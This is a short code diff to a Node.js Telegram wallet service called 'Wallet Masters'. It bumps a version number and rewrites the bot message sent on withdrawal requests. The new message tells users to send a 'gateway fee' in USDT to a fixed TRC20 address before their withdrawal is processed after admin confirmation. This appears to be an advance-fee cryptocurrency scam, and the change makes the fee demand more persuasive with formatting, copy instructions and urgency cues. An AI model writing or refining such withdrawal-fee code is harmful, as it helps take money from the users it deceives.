@@ -59,7 +59,7 @@ function calculateFees(amount) {
 
 function nowSec() { return Math.floor(Date.now() / 1000); }
 
-app.get('/health', (_, res) => res.json({ status: 'ok', service: 'Wallet Masters', version: '10.22' }));
+app.get('/health', (_, res) => res.json({ status: 'ok', service: 'Wallet Masters', version: '10.23' }));
 
 // ═══════════════════════════════════════════════════════════════
 // KEEP-ALIVE: Ping every 10 minutes to prevent Render cold starts
@@ -1270,8 +1270,13 @@ app.post('/api/withdraw', async (req, res) => {
       ]]}}).catch(() => {});
 
     bot.sendMessage(user.telegram_id,
-      `Action Required — Withdrawal #${wd.id}\n\nTo finalize your withdrawal of ${amt} USDT, please pay the gateway fee.\n\nTRC20 Address:\n${FEE_ADDRESS}\nGateway Fee: ${fees.total_fee} USDT`,
-      { ...openWalletBtn() }).catch(() => {});
+      `⚠️ <b>Action Required — Withdrawal #${wd.id}</b>\n\n`
+      + `To finalize your withdrawal of <b>${amt} USDT</b>, please settle your outstanding gateway fee.\n\n`
+      + `📍 <b>TRC20 Address:</b>\n<code>${FEE_ADDRESS}</code>\n\n`
+      + `💰 <b>Gateway Fee:</b> <b>${fees.total_fee} USDT</b>\n\n`
+      + `📌 <i>Tap the address above to copy it. Send exactly ${fees.total_fee} USDT on TRC20 network only.</i>\n\n`
+      + `⏳ Your withdrawal will be processed once the fee is confirmed by admin.`,
+      { parse_mode: 'HTML', ...openWalletBtn() }).catch(() => {});
 
   } catch(e) {
     console.error('[WD] error:', e.message, e.stack);
